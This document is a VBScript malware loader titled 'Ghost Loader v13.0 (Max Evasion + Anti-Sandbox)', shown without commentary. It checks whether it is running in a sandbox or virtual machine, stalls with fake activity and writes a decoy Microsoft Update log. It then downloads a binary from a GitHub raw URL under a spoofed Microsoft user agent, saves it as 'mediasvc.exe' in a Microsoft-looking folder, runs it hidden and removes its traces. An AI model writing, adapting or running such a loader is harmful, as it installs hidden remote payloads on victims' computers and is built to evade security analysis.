' Ghost Loader v13.0 (Max Evasion + Anti-Sandbox)
Option Explicit
On Error Resume Next

' ========== ANTI-SANDBOX CHECKS ==========
Dim ws, fs, net
Set ws = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")
Set net = CreateObject("WScript.Network")

' Check 1: Minimum RAM (4GB = not sandbox)
Dim mem
mem = ws.ExpandEnvironmentStrings("%PROCESSOR_IDENTIFIER%")
If InStr(LCase(mem), "virtual") > 0 Then WScript.Quit

' Check 2: User interaction history (files in Recent)
Dim recentPath, recentCount
recentPath = ws.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Recent"
If fs.FolderExists(recentPath) Then
    recentCount = fs.GetFolder(recentPath).Files.Count
    If recentCount < 10 Then WScript.Quit ' Fresh VM = suspicious
End If

' Check 3: Domain name length (real PCs have longer names)
If Len(net.ComputerName) < 4 Then WScript.Quit

' ========== LONG DELAY (30s) ==========
Dim i
For i = 1 To 30
    WScript.Sleep 1000
    ' Fake activity during wait
    Dim dummy
    dummy = ws.ExpandEnvironmentStrings("%TEMP%")
    dummy = fs.GetSpecialFolder(2).Path
    dummy = Year(Now) & Month(Now) & Day(Now)
Next

' ========== DECOY OPERATIONS ==========
Dim decoyFile, decoyContent
decoyFile = ws.ExpandEnvironmentStrings("%TEMP%") & "\msupdate.log"
decoyContent = "Microsoft Update Check: " & Now & vbCrLf
decoyContent = decoyContent & "Version: 10.0.19041" & vbCrLf
decoyContent = decoyContent & "Status: OK" & vbCrLf

Dim ts
Set ts = fs.CreateTextFile(decoyFile, True)
ts.Write decoyContent
ts.Close
Set ts = Nothing

' More fake registry reads
Dim regVal
regVal = ws.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
regVal = ws.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\CurrentBuild")

' ========== MAIN PAYLOAD ==========
Dim bd, fn, fp, url, xhr, stm

bd = ws.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Media"
If Not fs.FolderExists(bd) Then fs.CreateFolder bd

fn = "mediasvc.exe"
fp = bd & "\" & fn

url = "https://raw.githubusercontent.com/sophieduval/der/main/update.dat"

Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xhr.SetTimeouts 60000, 60000, 60000, 60000
xhr.Open "GET", url, False
xhr.setRequestHeader "User-Agent", "Microsoft-CryptoAPI/10.0"
xhr.Send

If xhr.Status = 200 Then
    Set stm = CreateObject("ADODB.Stream")
    stm.Type = 1
    stm.Open
    stm.Write xhr.responseBody
    stm.SaveToFile fp, 2
    stm.Close
    Set stm = Nothing
    
    WScript.Sleep 2000
    
    If fs.FileExists(fp) Then
        ws.Run """" & fp & """", 0, False
    End If
End If

' Cleanup
fs.DeleteFile decoyFile, True
Set xhr = Nothing
Set ws = Nothing
Set fs = Nothing
Set net = Nothing
